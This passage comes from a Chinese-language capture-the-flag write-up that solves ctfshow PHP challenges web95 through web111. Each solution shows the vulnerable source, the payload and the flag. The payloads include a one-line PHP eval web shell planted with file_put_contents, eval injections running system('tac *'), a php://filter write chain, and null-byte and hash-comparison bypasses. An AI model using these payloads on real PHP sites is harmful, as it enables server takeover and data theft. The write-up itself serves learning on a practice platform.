class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接用八进制，然后用空格或者换行符</p>
<p>?num=%20010574</p>
<p>?num=%0a010574+1</p>
<p>?num=+010574</p>
<p>?num=%2b010574    %2b是+</p>
<p>太巧了4476/8=520</p>
<p>intval常见输出</p>
<p><img src="/2025/02/05/php%E7%89%B9%E6%80%A7/image-20250124022043836.png" alt="image-20250124022043836"></p>
<p>ctfshow{8719f1fd-f070-4353-8e9a-a33948b0d9de}</p>
<h1>web96</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?u=php://filter/convert.base64-encode/resource=flag.php</p>
<p>这里的新方法:?u=./flag.php</p>
<p>ctfshow{39dcec3b-7245-4618-be73-b8b96130ab94}</p>
<h1>web97</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>md5无法处理数组。好像强弱比较都可以用数组绕过</p>
<p>好像还有md5碰撞<a href="https://blog.csdn.net/qq_49480008/article/details/113753951">https://blog.csdn.net/qq_49480008/article/details/113753951</a></p>
<p>ctfshow{97595aeb-9a38-4a87-ada7-8bcc9a31859e}</p>
<h1>web98</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>?同java当中的?的用法相同：如果满足条件则返回true的结果，否则返回flase的结果</p>
<p>倒着分析：</p>
<p>1.这里我们要拿到最后的$flag：我们要get一个HTTP_FLAG，而且HTTP_FLAG还要等于flag</p>
<p>2.如果我们get的flag等于flag，那么get变为$_SERVER</p>
<p>3.如果我们get的flag等于flag，那么get变为$_COOKIE</p>
<p>4.get是否有参数，如果有，则把post的值给get。也就是说a=b;b=1;。源码当中的&amp;就是引用post的</p>
<p>这里的234条件只要2条件，因为34条件对我们拿flag没有用。</p>
<p>get参数可以为任何字母、数字，但不能没有</p>
<p>?*</p>
<p>post=HTTP_FLAG=flag</p>
<p>ctfshow{e8fc547b-9f20-4fc8-88aa-e463e93ee0aa}</p>
<h1>web99</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>in_arry()与intval() 一样，1123aaaa=1123(in_array延用了php中的==)</p>
<p>?n=1.php</p>
<p>post=content=<?php @eval($_POST[a]); ?></p>
<p>antsword连接(百度解决antsword的问题)，或者正常方法搞</p>
<p>ctfshow{836ba253-49ea-4e93-852a-1df05664ac15}</p>
<h1>web100</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑运算符的优先级：“&amp;&amp;” &gt; “||” &gt; “=” &gt; “and”，等号的优先级高于and，所以v0只跟v1有关系，v2和v3是干扰。所以$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);这一段只会执行$v0=is_numeric($v1)，后边的就没有用了</p>
<p>?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;</p>
<p>或者</p>
<p>?v1=1&amp;v2=@eval($_POST[zmr])?&gt;/<em>&amp;v3=</em>/;</p>
<p>zmr=system(‘tac f*’);</p>
<p>好像存在过滤，…咋过滤的啊，不知道。直接tac *</p>
<p>zmr=system(‘tac *’);</p>
<p>flag_is_7a396b080x2d9bbf0x2d49bb0x2d95960x2d337c22cf6fde</p>
<p>flag_is_7a396b080x2d9bbf0x2d49bb0x2d95960x2d337c22cf6fde</p>
<p>0x2d是-</p>
<p>ctfshow{7a396b08-9bbf-49bb-9596-337c22cf6fde}</p>
<h1>web101</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反射，通俗来讲就是可以通过一个对象来获取所属类的具体内容，php中内置了强大的反射API：</p>
<ul>
<li>ReflectionClass：一个反射类，功能十分强大，内置了各种获取类信息的方法，创建方式为new ReflectionClass(str 类名)，可以用echo new ReflectionClass(‘className’)打印类的信息。</li>
<li>ReflectionObject：另一个反射类，创建方式为new ReflectionObject(对象名)。</li>
</ul>
<p>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p>
<p>flag_15b848760x2d91540x2d45430x2db2770x2dc72dcd68eb6</p>
<h1>web102</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题卢本伟有话说：**</p>
<p>hex2bin，php当中的函数，对什么什么使用hex解码</p>
<p>call_user_func($v1,$s)的意思是调用$v1这个函数解析$s这个值</p>
<p>substr($v2,2)的意思是从v2的第三个字符开始读取，那v2如果是命令的话，前面得加俩字母或者其他东西</p>
<p>先理解一下if外面的函数</p>
<p>总之是要拼接file_put_contents($v3,$str);</p>
<p>​		那么v3=1.php。str=system(tac *);</p>
<p>​	再看v3，没有啥限制。</p>
<p>​	再看str，$str = call_user_func($v1,$s);</p>
<p>​		v1=system，$s=tac *</p>
<p>​	再看substr($v2,2)，</p>
<p>​		v2=aatac *</p>
<p>​	再看v4，必须是数字才可以进入if函数，但是上面我们的v2=是字母，而不是数字，那么我们要弄成数字，怎么弄？变成八进制？但是八进制的话需要两步才可以拿到字符串，变成十六进制？好像可以，但是十六进制里面有字母啊，没关系，有时候十六进制也都会是数字(这里可以含有字母e)，找一找(这里就是卢本伟吐槽的地方了)</p>
<p>​	这里我们:v1=hex2bin，v2(经过base64和hex加密)=115044383959474e6864434171594473，然后v3=php://filter/write=convert.base64-decode/resource=1.php，就完美解决所以问题了。</p>
<p>不得不说，前人的智慧啊，流弊。</p>
<p>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</p>
<p>post=v1=hex2bin</p>
<p>ctfshow{f71c0477-b08e-46ff-aa38-15033961057e}</p>
<h1>web103</h1>
<p>道理同web101</p>
<h1>web104</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题比较简单，不分析了</p>
<p>?v2=2</p>
<p>post=v1=2</p>
<p>ctfshow{ac04649d-e36e-40eb-b6ca-473940be8d59}</p>
<h1>web105</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：你还想要flag嘛？</span></span><br></pre></td></tr></table></figure>
<p>$$为覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">	<span class="variable">$$a</span> = <span class="string">&#x27;world&#x27;</span>  <span class="comment">#相当于$($a) = &#x27;world&#x27;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$hello</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#输出:world</span></span><br></pre></td></tr></table></figure>
<p>$suces	$error	$flag</p>
<p>这道题最后一行有一个回显内容是$error的内容/不论post的内容为什么，都会输出$error(输入flag=flag又会进入一种循环)</p>
<p>我们可以利用源码当中的$$替换$flag到的die($error)</p>
<p>$$key=$$value</p>
<p>$suces=$flag</p>
<p>$$key=$$value</p>
<p>$error=$suces</p>
<p>?a=flag</p>
<p>post=error=a</p>
<p>ctfshow{09b3bd0b-d190-46a3-a74d-34cbd51027e3}</p>
<h1>web106</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sha1弱比较<br>
aaroZmOk<br>
aaK1STfY<br>
aaO8zKZF<br>
aa3OFF9m</p>
<p>经过sha1单向加密后的结果正好是零的科学计数法的形式</p>
<p>那这样正好绕过sha1函数和!=</p>
<p>ctfshow{50a2ad6f-2084-4155-b7f0-1ef62e03c8f8}</p>
<h1>web107</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       <span class="title function_ invoke__">parse_str</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>parse_str(string,arry)的意思是把格式为xxx=123的东西以数组的形式存进arry，当echo arry[‘xxx’]时的结果是123</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;q=123&amp;p=456&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;q&#x27;</span>];   <span class="comment">//输出123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>[<span class="string">&#x27;p&#x27;</span>];   <span class="comment">//输出456</span></span><br></pre></td></tr></table></figure>
<p>?v3=1</p>
<p>post:v1=flag=c4ca4238a0b923820dcc509a6f75849b</p>
<p>ctfshow{f3f4f0a2-04b1-4e1a-a848-17f9f5a7325c}</p>
<h1>web108</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
<p>就是说，我前面随便写字母，在数字之前用%00会结束ereg继续往下读取</p>
<p>strrev()函数会颠倒字符串：123变成321</p>
<p>?c=aawedagiufuiafg%00778</p>
<p>ctfshow{e59c653b-ab46-4ab8-8616-5981adf48b4a}</p>
<h1>web109</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?v1=Exception&amp;v2=system(‘cat fl36dg.txt’)</p>
<p>或者</p>
<p>?v1=ReflectionClass&amp;v2=system(‘ls’)<br>
?v1=ReflectionClass&amp;v2=system(‘cat f*’)</p>
<p>ctfshow{f1026488-7b30-4870-b70a-1591bf8c5984}</p>
<h1>web110</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FilesystemIterator获取目录文件<a href="http://phpff.com/filesystemiterator">FilesystemIterator</a><br>
getcwd()函数取得当前工作目录<a href="https://blog.csdn.net/baidu_35085676/article/details/52002579">getcwd()函数</a></p>
<p>?v1=FilesystemIterator&amp;v2=getcwd</p>
<p>直接访问fl36dga.txt</p>
<p>ctfshow{877b1427-8494-4b02-83da-50395cfd5c76}</p>
<h1>web111</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ 